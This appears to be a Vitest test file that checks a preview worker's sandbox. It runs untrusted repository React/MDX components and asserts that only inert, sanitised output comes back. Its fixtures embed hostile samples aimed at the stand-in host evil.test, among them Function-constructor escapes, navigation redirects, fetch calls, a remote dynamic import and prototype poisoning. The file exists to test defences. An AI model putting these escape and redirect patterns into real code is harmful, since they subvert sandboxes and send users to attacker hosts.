// @vitest-environment node
import vm from "node:vm"
import { describe, expect, it } from "vitest"
import { createSignedCompatibleFixture } from "@/lib/preview/__tests__/compatible-test-fixture"
import { verifySignedCompatiblePreviewResolution } from "@/lib/preview/compatible-artifact"
import {
  createCompatibleWorkerRenderer,
  createCompatibleWorkerSource,
  prepareCompatibleWorkerJob,
} from "../compatible-worker"

describe("compatible worker containment", () => {
  it("renders frozen framework-neutral named and namespace preview capabilities", async () => {
    const job = await prepareCompatibleWorkerJob({
      artifactId: "artifact-portable-capabilities",
      documentSource: "<CapabilityProbe />",
      adapter: {
        entryPath: "mdx-preview.tsx",
        sources: {
          "mdx-preview.tsx": `
            import {
              PREVIEW_OPTIONS,
              PreviewAction,
              PreviewBox,
              PreviewIcon,
              PreviewImage,
              PreviewInline,
              PreviewList,
              PreviewStack,
              PreviewText,
            } from "@repopress/preview"
            import * as Preview from "@repopress/preview"

            function CapabilityProbe() {
              try { PREVIEW_OPTIONS.tones.info = "mutated" } catch {}
              try { Preview.PreviewBox.extra = "mutated" } catch {}
              const sealed = Object.getPrototypeOf(PREVIEW_OPTIONS) === null
                && Object.getPrototypeOf(PREVIEW_OPTIONS.tones) === null
                && Object.isFrozen(PREVIEW_OPTIONS)
                && Object.isFrozen(PREVIEW_OPTIONS.tones)
                && PREVIEW_OPTIONS.tones.info === true
                && !("extra" in Preview.PreviewBox)
              return <PreviewBox tone="unsupported" arbitrary="ignored">
                <PreviewStack gap="spacious">
                  <PreviewInline gap="compact">
                    <PreviewIcon name="mail" />
                    <PreviewText as="h2" size="title" weight="medium">Portable title</PreviewText>
                  </PreviewInline>
                  <PreviewList style="check" items={["First item", "Second item"]} />
                  <PreviewImage src="https://evil.test/pixel" alt="Merry cover" aspect="wide" />
                  <PreviewAction
                    label="Open letter"
                    href="https://evil.test/leave"
                    onClick={() => { throw new Error("must never cross") }}
                  />
                  <PreviewText tone="muted">{sealed ? "SEALED_CAPABILITIES" : "MUTABLE_CAPABILITIES"}</PreviewText>
                </PreviewStack>
              </PreviewBox>
            }
            export default { components: { CapabilityProbe } }
          `,
        },
      },
    })
    const sent: unknown[] = []
    const listeners: Array<(event: { data?: unknown; ports?: unknown[] }) => void | Promise<void>> = []
    const port = {
      onmessage: null as ((event: { data: unknown }) => void) | null,
      close() {},
      postMessage(message: unknown) {
        sent.push(message)
      },
      start() {},
    }
    const context = vm.createContext({
      addEventListener: (_type: string, listener: (event: { data?: unknown; ports?: unknown[] }) => void) =>
        listeners.push(listener),
      removeEventListener() {},
    })
    vm.runInContext(createCompatibleWorkerSource(), context, { timeout: 1_000 })
    await listeners[0]({ ports: [port] })
    port.onmessage?.({
      data: { type: "repopress:render-compatible", requestId: "C".repeat(43), job },
    })

    expect(sent).toHaveLength(1)
    expect(sent[0]).toMatchObject({
      type: "repopress:rendered-compatible",
      fidelityLosses: [],
    })
    const serialized = JSON.stringify(sent[0])
    expect(serialized).toContain("SEALED_CAPABILITIES")
    expect(serialized).not.toContain("MUTABLE_CAPABILITIES")
    expect(serialized).toContain("Portable title")
    expect(serialized).toContain("First item")
    expect(serialized).toContain("Merry cover")
    expect(serialized).toContain("Open letter")
    expect(serialized).toContain("repopress-preview-box--neutral")
    expect(serialized).not.toMatch(/evil\.test|href|src|onClick|style/)
  })

  it("binds namespace imports as frozen null-prototype copies of the approved export map", async () => {
    const job = await prepareCompatibleWorkerJob({
      artifactId: "artifact-namespace",
      documentSource:
        'import * as UI from "@acme/ui"\n\n<UI.Callout>Namespace callout</UI.Callout>\n\n<Probe value={UI} />',
      adapter: {
        entryPath: "mdx-preview.tsx",
        sources: {
          "mdx-preview.tsx": `
            import React from "react"
            function Callout(props) { return <aside>{props.children}</aside> }
            const inheritedExports = { Secret: () => <p>EXPOSED_SECRET</p> }
            const approvedExports = Object.assign(Object.create(inheritedExports), { Callout })
            function Probe({ value }) {
              try { value.extra = "mutated" } catch {}
              const contained = Object.getPrototypeOf(value) === null
                && Object.isFrozen(value)
                && value.Callout === Callout
                && !("extra" in value)
                && !("Secret" in value)
              return <p>{contained ? "SEALED_NAMESPACE" : "MUTABLE_NAMESPACE"}</p>
            }
            export default {
              components: { Probe },
              allowImports: { "@acme/ui": approvedExports },
            }
          `,
        },
      },
    })
    expect(job.imports).toEqual([{ source: "@acme/ui", imported: "*", local: "UI" }])
    const sent: unknown[] = []
    const listeners: Array<(event: { data?: unknown; ports?: unknown[] }) => void | Promise<void>> = []
    const port = {
      onmessage: null as ((event: { data: unknown }) => void) | null,
      close() {},
      postMessage(message: unknown) {
        sent.push(message)
      },
      start() {},
    }
    const context = vm.createContext({
      addEventListener: (_type: string, listener: (event: { data?: unknown; ports?: unknown[] }) => void) =>
        listeners.push(listener),
      removeEventListener() {},
    })
    vm.runInContext(createCompatibleWorkerSource(), context, { timeout: 1_000 })
    await listeners[0]({ ports: [port] })
    port.onmessage?.({
      data: { type: "repopress:render-compatible", requestId: "N".repeat(43), job },
    })

    expect(sent).toHaveLength(1)
    expect(sent[0], JSON.stringify(sent[0])).toMatchObject({ type: "repopress:rendered-compatible" })
    const serialized = JSON.stringify(sent[0])
    expect(serialized).toContain("Namespace callout")
    expect(serialized).toContain("SEALED_NAMESPACE")
    expect(serialized).not.toContain("MUTABLE_NAMESPACE")
    expect(serialized).not.toContain("EXPOSED_SECRET")
  })

  it("runs repository components without a DOM/navigation realm and returns only inert output", async () => {
    const job = await prepareCompatibleWorkerJob({
      artifactId: "artifact-hostile",
      documentSource: "<Escape />",
      adapter: {
        entryPath: "mdx-preview.tsx",
        sources: {
          "mdx-preview.tsx": `
            import React from "react"
            function Escape() {
              React.useEffect(() => { globalThis.location.href = "https://evil.test/effect" }, [])
              React.useLayoutEffect(() => {}, [])
              React.useState(0)
              React.useReducer((value) => value, 0)
              React.useRef(null)
              const constructor = (() => {}).constructor
              if (constructor) constructor("globalThis.location.href='https://evil.test/constructor'")()
              const asyncConstructor = Object.getPrototypeOf(async function () {}).constructor
              if (asyncConstructor) asyncConstructor("globalThis.location.href='https://evil.test/async-constructor'")()
              if (typeof postMessage === "function") postMessage({ type: "repopress:rendered-compatible" })
              if (typeof fetch === "function") fetch("https://evil.test/fetch")
              return <a
                href="https://evil.test/link"
                style={{ backgroundImage: "url(https://evil.test/style)" }}
                onClick={() => { globalThis.location.href = "https://evil.test/event" }}
                ref={() => { globalThis.location.href = "https://evil.test/ref" }}
              ><img src="https://evil.test/image" />Contained</a>
            }
            export default { components: { Escape } }
          `,
        },
      },
    })
    const sent: unknown[] = []
    const listeners: Array<(event: { data?: unknown; ports?: unknown[] }) => void | Promise<void>> = []
    const workerLocation = { href: "blob:null/repopress-owned-worker" }
    const port = {
      closed: false,
      onmessage: null as ((event: { data: unknown }) => void) | null,
      close() {
        this.closed = true
      },
      postMessage(message: unknown) {
        sent.push(message)
      },
      start() {},
    }
    const context = vm.createContext({
      console,
      location: workerLocation,
      addEventListener: (
        type: string,
        listener: (event: { data?: unknown; ports?: unknown[] }) => void | Promise<void>,
      ) => {
        if (type === "message") listeners.push(listener)
      },
      removeEventListener: () => {},
    })
    vm.runInContext(createCompatibleWorkerSource(), context, { timeout: 1_000 })

    expect(listeners).toHaveLength(1)
    await listeners[0]({ ports: [port] })
    expect(port.onmessage).not.toBeNull()
    port.onmessage?.({
      data: {
        type: "repopress:render-compatible",
        requestId: "R".repeat(43),
        job,
      },
    })

    expect(workerLocation.href).toBe("blob:null/repopress-owned-worker")
    expect(sent).toHaveLength(1)
    expect(sent[0]).toMatchObject({ type: "repopress:rendered-compatible", requestId: "R".repeat(43) })
    const serialized = JSON.stringify(sent[0])
    expect(serialized).toContain("Contained")
    expect(serialized).not.toMatch(/evil\.test|href|style|ref/)
    expect(sent[0]).toMatchObject({
      fidelityLosses: expect.arrayContaining([
        "STATIC_INERT_EFFECT",
        "STATIC_INERT_LAYOUT_EFFECT",
        "STATIC_INERT_STATE",
        "STATIC_INERT_REDUCER",
        "STATIC_INERT_REF",
        "STATIC_INERT_EVENT",
        "STATIC_INERT_LINK",
        "STATIC_INERT_MEDIA",
        "STATIC_INERT_STYLE",
      ]),
    })
  })

  it("reports timeout and worker errors with closed bounded pipeline codes", async () => {
    const job = await prepareCompatibleWorkerJob({ artifactId: "artifact", documentSource: "# Static", adapter: null })
    const unresponsivePort = {
      onmessage: null as ((event: MessageEvent) => void) | null,
      close() {},
      postMessage() {},
      start() {},
    }
    const timeoutRenderer = createCompatibleWorkerRenderer({
      createWorker: () => ({ postMessage() {}, terminate() {} }),
      createMessageChannel: () => ({ port1: unresponsivePort, port2: {} as Transferable }),
      createRequestId: () => "T".repeat(43),
      timeoutMs: 1,
    })
    await expect(timeoutRenderer.render(job)).rejects.toMatchObject({ code: "COMPATIBLE_WORKER_TIMEOUT" })

    const errorPort = {
      onmessage: null as ((event: MessageEvent) => void) | null,
      close() {},
      postMessage() {
        this.onmessage?.({
          data: {
            type: "repopress:compatible-error",
            requestId: "E".repeat(43),
            code: "COMPATIBLE_EXECUTION_FAILED",
          },
        } as MessageEvent)
      },
      start() {},
    }
    const errorRenderer = createCompatibleWorkerRenderer({
      createWorker: () => ({ postMessage() {}, terminate() {} }),
      createMessageChannel: () => ({ port1: errorPort, port2: {} as Transferable }),
      createRequestId: () => "E".repeat(43),
    })
    await expect(errorRenderer.render(job)).rejects.toMatchObject({ code: "COMPATIBLE_EXECUTION_FAILED" })
  })

  it("rejects dynamic imports before any repository code reaches the worker", async () => {
    await expect(
      prepareCompatibleWorkerJob({
        artifactId: "artifact-import",
        documentSource: "# Safe",
        adapter: {
          entryPath: "mdx-preview.tsx",
          sources: {
            "mdx-preview.tsx": `
              const deferred = import("https://evil.test/module.js")
              export default { scope: { deferred } }
            `,
          },
        },
      }),
    ).rejects.toThrow("Dynamic imports are unavailable")
  })

  it("keeps ordinary supported semantic static content lossless", async () => {
    const job = await prepareCompatibleWorkerJob({
      artifactId: "artifact-static",
      documentSource: "# Static heading\n\nA supported paragraph.",
      adapter: null,
    })
    const sent: unknown[] = []
    const listeners: Array<(event: { data?: unknown; ports?: unknown[] }) => void | Promise<void>> = []
    const port = {
      onmessage: null as ((event: { data: unknown }) => void) | null,
      close() {},
      postMessage(message: unknown) {
        sent.push(message)
      },
      start() {},
    }
    const context = vm.createContext({
      addEventListener: (_type: string, listener: (event: { data?: unknown; ports?: unknown[] }) => void) =>
        listeners.push(listener),
      removeEventListener() {},
    })
    vm.runInContext(createCompatibleWorkerSource(), context, { timeout: 1_000 })
    await listeners[0]({ ports: [port] })
    port.onmessage?.({
      data: { type: "repopress:render-compatible", requestId: "S".repeat(43), job },
    })

    expect(sent).toHaveLength(1)
    expect(sent[0]).toMatchObject({
      type: "repopress:rendered-compatible",
      fidelityLosses: [],
      tree: expect.arrayContaining([expect.objectContaining({ kind: "element", tag: "h1" })]),
    })
  })

  it("preserves signed fidelity accounting when repository code poisons intrinsics and hook properties", async () => {
    const fixture = await createSignedCompatibleFixture({
      documentSource: "<Poisoned />",
      adapter: {
        entryPath: "mdx-preview.tsx",
        sources: {
          "mdx-preview.tsx": `
            import React from "react"
            try { Set.prototype.add = () => undefined } catch {}
            try { Array.from = () => [] } catch {}
            try { Array.prototype.sort = () => [] } catch {}
            try { Array.prototype[Symbol.iterator] = function* () {} } catch {}
            try { Object.keys = () => [] } catch {}
            try { Object.entries = () => [] } catch {}
            try { String = () => "" } catch {}
            try { Boolean = () => false } catch {}
            try { React.useEffect = () => undefined } catch {}
            try { React.useState = () => [0, () => undefined] } catch {}
            function Poisoned() {
              React.useEffect(() => undefined, [])
              React.useState(0)
              React.Children.count([["nested", "children"]])
              const validElement = React.isValidElement(<span>probe</span>)
              const firstId = React.useId()
              const secondId = React.useId()
              return <article
                onClick={() => undefined}
                style={{ color: "red" }}
              >
                <h2>Poison resistant</h2>
                <p>VISIBLE</p>
                <p>{validElement ? "VALID_REACT_NODE" : "REJECTED_REACT_NODE"}</p>
                <p>{firstId === secondId ? "DUPLICATE_IDS" : "UNIQUE_IDS"}</p>
                <a href="https://evil.test">Link</a>
              </article>
            }
            export default { components: { Poisoned } }
          `,
        },
      },
    })
    const verified = await verifySignedCompatiblePreviewResolution(fixture.wire, {
      publicKey: fixture.publicKey,
      expectedAuthority: fixture.expectedAuthority,
    })
    expect(verified).not.toBeNull()
    const job = await prepareCompatibleWorkerJob(verified?.artifact ?? fixture.resolution.artifact)
    const sent: unknown[] = []
    const listeners: Array<(event: { data?: unknown; ports?: unknown[] }) => void | Promise<void>> = []
    const port = {
      onmessage: null as ((event: { data: unknown }) => void) | null,
      close() {},
      postMessage(message: unknown) {
        sent.push(message)
      },
      start() {},
    }
    const context = vm.createContext({
      addEventListener: (_type: string, listener: (event: { data?: unknown; ports?: unknown[] }) => void) =>
        listeners.push(listener),
      removeEventListener() {},
    })
    vm.runInContext(createCompatibleWorkerSource(), context, { timeout: 1_000 })
    await listeners[0]({ ports: [port] })
    port.onmessage?.({
      data: { type: "repopress:render-compatible", requestId: "P".repeat(43), job },
    })

    expect(sent).toHaveLength(1)
    expect(sent[0]).toMatchObject({
      type: "repopress:rendered-compatible",
      fidelityLosses: expect.arrayContaining([
        "STATIC_INERT_EFFECT",
        "STATIC_INERT_STATE",
        "STATIC_INERT_EVENT",
        "STATIC_INERT_STYLE",
        "STATIC_INERT_LINK",
        "STATIC_INERT_UNSUPPORTED_COMPONENT",
      ]),
      tree: expect.arrayContaining([expect.objectContaining({ kind: "element", tag: "article" })]),
    })
    const serialized = JSON.stringify(sent[0])
    expect(serialized).toContain("VISIBLE")
    expect(serialized).toContain("VALID_REACT_NODE")
    expect(serialized).not.toContain("REJECTED_REACT_NODE")
    expect(serialized).toContain("UNIQUE_IDS")
    expect(serialized).not.toContain("DUPLICATE_IDS")
    expect(serialized).not.toContain("evil.test")
  })
})
